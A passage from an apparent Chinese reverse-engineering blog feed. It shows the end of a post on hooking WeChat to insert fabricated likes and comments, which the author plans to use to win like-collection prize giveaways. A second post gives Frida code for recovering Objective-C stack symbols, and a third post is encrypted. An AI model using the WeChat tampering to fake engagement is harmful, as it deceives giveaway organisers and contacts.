wxid_6913ohfkk7kq12nickname: xia0content: 评论测试source: 0type: 2createTime: 1564225144isLocalAdded: 1commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName: (null)bDeleted: 0)</code></pre><p>到这里我们还可以发现赞和评论都是一个类（模型），只是里面的类型字段不同。现在我们其实已经拿到了我们想要的数据模型了。但是还有一个问题在于我们应该什么时候去更改这些数据呢？也就是我们说的hook点。</p><p>最好的hook可以想到是每次刷新数据的时候，这样我们的数据就是最新的。</p><h5 id="寻找HOOK点"><a href="#寻找HOOK点" class="headerlink" title="寻找HOOK点"></a>寻找HOOK点</h5><p>先想一下，刷新数据的时候，当拿到新的数据肯定会封装为一个<code>WCDataItem</code>对象，那么我们可以对<code>WCDataItem</code>里面的方法下断点，然后打印调用链不就反向得到了刷新的函数了吗？</p><p>但是逆向和调试过微信的人都知道，当你使用bt命令的时候只能得到一堆无符号的调用栈像下面这样</p><pre><code>(lldb) bt* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 4.1  * frame #0: 0x000000010857d4d0 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 30312888    frame #1: 0x0000000194fcc638 Foundation`_decodeObjectBinary + 2004    frame #2: 0x0000000194fcbb6c Foundation`_decodeObject + 340    frame #3: 0x0000000194ed24fc Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228    frame #4: 0x0000000194f2a09c Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92    frame #5: 0x0000000105a88404 WeChat`int fmt::internal::CharTraits&lt;char&gt;::format_float&lt;long double&gt;(char*, unsigned long, char const*, unsigned int, int, long double) + 2432992    frame #6: 0x0000000108da9ea8 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38884240    frame #7: 0x0000000108daa890 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38886776    frame #8: 0x0000000108dad178 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38897248    frame #9: 0x0000000108717394 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 31991932</code></pre><p>但是用我写的sbt命令就能恢复oc符号，下面我们对<code>-[WCDataItem setCid:]</code>下断点，然后得到调用栈</p><pre><code>(lldb) sbt==========================================xia0LLDB==========================================  BlockSymbolFile    Not Set The Block Symbol Json File, Try &#39;sbt -f&#39;============================================================================================  frame #0: [file:0x103c094d0 mem:0x10857d4d0] WeChat`-[WCDataItem setCid:] + 0  frame #1: [file:0x18193c638 mem:0x194fcc638] Foundation`_decodeObjectBinary + 2004  frame #2: [file:0x18193bb6c mem:0x194fcbb6c] Foundation`_decodeObject + 340  frame #3: [file:0x1818424fc mem:0x194ed24fc] Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228  frame #4: [file:0x18189a09c mem:0x194f2a09c] Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92  frame #5: [file:0x101114404 mem:0x105a88404] WeChat`+[CUtility SafeUnarchiveFromData:] + 64  frame #6: [file:0x104435ea8 mem:0x108da9ea8] WeChat`-[WCAdvertiseDataHelper hasCommented:] + 116  frame #7: [file:0x104436890 mem:0x108daa890] WeChat`-[WCAdvertiseDataHelper IsAdvertiseDataValid:] + 48  frame #8: [file:0x104439178 mem:0x108dad178] WeChat`-[WCAdvertiseDataHelper getAdvertiseDataByCurMinTime:MaxTime:] + 552  frame #9: [file:0x103da3394 mem:0x108717394] WeChat`Maybe c function? Distance:3348 &gt;= 2500 # Symbol:-[WCTimelineMgr tryRemoveCachesOfLikeUserWithNewTimelineList:] + 3348  frame #10: [file:0x206a0 mem:0x1131f06a0] WeChat`-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] + 233  frame #11: [file:0x103db00c8 mem:0x1087240c8] WeChat`Maybe c function? Distance:9732 &gt;= 2500 # Symbol:-[WCTimelineDataProvider responseForSnsTimeLineResponse:Event:] + 9732  frame #12: [file:0x103db0398 mem:0x108724398] WeChat`-[WCTimelineDataProvider MessageReturn:Event:] + 112  frame #13: [file:0x1033923c0 mem:0x107d063c0] WeChat`-[CAppObserverCenter NotifyFromMainCtrl:Event:] + 336  frame #14: [file:0x104c292f8 mem:0x10959d2f8] WeChat`-[CMainControll TimerCheckEvent] + 728  frame #15: [file:0x1800a3604 mem:0x193733604] libobjc.A.dylib`-[NSObject performSelector:withObject:] + 68  frame #16: [file:0x101cb1fa8 mem:0x106625fa8] WeChat`-[MMNoRetainTimerTarget onNoRetainTimer:] + 84  frame #17: [file:0x1819750bc mem:0x1950050bc] Foundation`__NSFireTimer + 88  frame #18: [file:0x180e3d0a4 mem:0x1944cd0a4] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 32  frame #19: [file:0x180e3cdd0 mem:0x1944ccdd0] CoreFoundation`__CFRunLoopDoTimer + 884  frame #20: [file:0x180e3c5c4 mem:0x1944cc5c4] CoreFoundation`__CFRunLoopDoTimers + 252  frame #21: [file:0x180e37284 mem:0x1944c7284] CoreFoundation`__CFRunLoopRun + 1832  frame #22: [file:0x180e36844 mem:0x1944c6844] CoreFoundation`CFRunLoopRunSpecific + 452  frame #23: [file:0x1830e5be8 mem:0x196775be8] GraphicsServices`GSEventRunModal + 104  frame #24: [file:0x1ae78431c mem:0x1c1e1431c] UIKitCore`UIApplicationMain + 216  frame #25: [file:0x100152b04 mem:0x104ac6b04] WeChat`main + 1387268  frame #26: [file:0x1808ec020 mem:0x193f7c020] libdyld.dylib`start + 4</code></pre><p>可以看到调用栈的符号已经恢复了，能够清晰的看出调用的过程</p><p>其中里面有个很明显的方法</p><p><code>-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:]</code></p><p>看名字就知道，这个应该就是我们需要的hook点。</p><h5 id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h5><p>整理一下目前的情况，首先拿到了赞和评论的模型，然后找到了hook点。下一步就是写代码去实现集赞的功能。</p><p>大概的代码逻辑应该如下</p><ul><li>在hook点的时候拿到原始的朋友圈数据，并过滤出自己的那条朋友圈</li><li>取出自己朋友圈的赞和评论数据备用</li><li>随机从通讯录好友里面选择数量去构造赞和评论对象，并放入原朋友圈赞和评论列表里面</li></ul><p>下面就是写代码实现就可以了。还有个情况是在你进入自己的朋友圈详情界面的时候，也就是看到点赞的人都是头像的界面。也需要做类似的操作才能实现集赞的功能。</p><p>这里分析的过程和上面类似，我选择的hook点为：<br><code>-[WCCommentDetailViewControllerFB setDataItem:]</code></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>具体的代码实现这里就不再去分析了，我把代码开源到了这里<a href="https://github.com/4ch12dy/fkwechatzan">fkwechatzan</a></p><h4 id="完成效果"><a href="#完成效果" class="headerlink" title="完成效果"></a>完成效果</h4><ul><li><p>集赞助手设置界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1361564255775_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li></ul><ul><li><p>朋友圈详情界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1341564229215_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li><li><p>赞和评论</p></li></ul><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1321564227655_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p><h4 id="一点总结"><a href="#一点总结" class="headerlink" title="一点总结"></a>一点总结</h4><p>本文详细介绍了使用issh和xia0LLDB去完成一个集赞功能的逆向分析过程，这个功能本身不是很复杂，这里仅仅我在逆向过程中的一些理解和分析。每个人的逆向分析过程可能都不尽相同，我提供一个完整的分析步骤，而不是完全的去靠猜测，虽然逆向有时候猜测就能有一些意外惊喜，不过不确定性也同样会花费大量时间。</p><p>最后，妈妈再也不用担心没有人赞我的朋友圈了~</p><p>下次集赞领礼品的活动我要定了！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;微信集赞-评论插件分析及开发&quot;&gt;&lt;a href=&quot;#微信集赞-评论插件分析及开发&quot; class=&quot;headerlink&quot; title=&quot;微信集赞/评论插件分析及开发&quot;&gt;&lt;/a&gt;微信集赞/评论插件分析及开发&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-08-01T07:53:10.362Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title>android调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid-debug-note/andoid-debug-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid-debug-note/andoid-debug-note/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-08-01T07:52:05.503Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1+9224k047qkIR3IGcd9SA4gloxmPk0TPo91Z6F6brW4JZQ3hRhpoKa3JttmQBQHcqmm8onJKi32/Gjl4n3G+6MdHgLnCjYf2vn+f85w09oahEZuDr8T2H0mMIAVddq7CDufhOz8Y2XCV4bPZfxEH7HCmnxUGJTwY0K/RWno8SvV1g9lUZ/OdjJhr7tO5jEB/IpmYZSKt8wjHawDaGJVS/TTmA2Vu38o1c/1beysG+f0Rw0sTZ9ZE0mO7ktQ1L7r9D+c3NvHMl0aunOIngrhqRaVUQKj1K9mLWtwW+juy+iDPB9vUzLz/R6gsboIA7NLltvg2ngURsAkM1kLAc2bvbj989A8XN4Bz7fYXxZdDCJYkIYrt7mObOfA4h1rQgU0cAcWolL/0ZHuIF1TH7XsURQF+Ep8LOu+QPn9eDzbRN3qTFoLkXsERUxVxmqcFuSoFiWXgFX5K2M28zWCe1ZFeyB2Gi6Ccc5fQj+OBigryrSo+qWHmnrTMm942zh6zpG79YAvOybSqJn1b9G5xSZ/gqH0UEpDsii5RszojwkvqMrtI+cnj4EiQ3OmTT8XLq6R5ZBNegjePMCufffSQoSNUh08OWxPVtxKImQcqkbwann5S6tLs1FSPPrDPDMX7PtC+mu9w74kLjhbEvoyXej4tscTH1a9pSz2tqIgGNXBCV1OO25ON3TL/4f2h0GukVrA44XY4UXj3fCAJf361vHyHJfgjleaRJNo0tJrz7eNscPy0otdXbz1Ce5/4m3oJHtT7Z0ait2jbd6uhLNWruhTecKW4bA104LFyVIIvkZd2CQCXrPS9cyIIAjjx/VjD1VeLaJCQL8grFv1nz3nt54m2ym1BR4n5prjWqy/JPWUKhC4/Y41jDt4FtUU+fE0t0OGLPed84qRcXtwsI+hRaT/ueQPA2KJlKFp8pL4xmMHJz6x9MKquz9DFZolR0W3RjypW+TUBQ28N5cEpw+KYeMADMrDflxpaKZPi6hJhr9cMfk7Q5Fd7iyaqOVKq3Mvz8abaSYMaLx5sw7W8DOgKwLOuAae1f52Rv0rPWwoXHjaebjMUG3mM8thMx1JUxEsW2LlJYKVzAa+rYJQFv3xD7r15c8KqgcANe2c3VFwXthMGU7+bnRRSJ0qNIE0tSnCq+Jqf96aa1iDNMQG3SIGraQFQjxeXk2jOUBpht13ZVQJIr9HyRXQOMq9lKTsej61RxjfZZdDixJDtAg54ylzugv1oT9QereKRVPZbZxw60Ot43T0kez5uDQBHiC5v+vtzfNAqLQCKQeNl+7a3UUA3JmZgmmwDH1X1aygegaHBliqYcEDuJVl0B2i0Irv6a2VSMf6NB2KndgZnYMI6j9vr+iLjJsmPyj97K2+wUmjwzCvTXd46RUuVln+mWuaC0gSgNBw6ujRQ004Io+ipx7A08+rCYLErKgITUJpts/VBGbCkFY/ACxrHTXM9cqpuANDXpY/XH4X61oBZTnliXCjblDTDcdc3F9XDt9ER+ndl2X+a+m0npYs1lStGCzvxr/+CWJg1kCNMa6nQww0tyvNIP1cFG6JnkUy/iS7N2tN0S9Jc6CY94++mZLbr8cKNgGDnlW3owA6fNhClTklkFtHG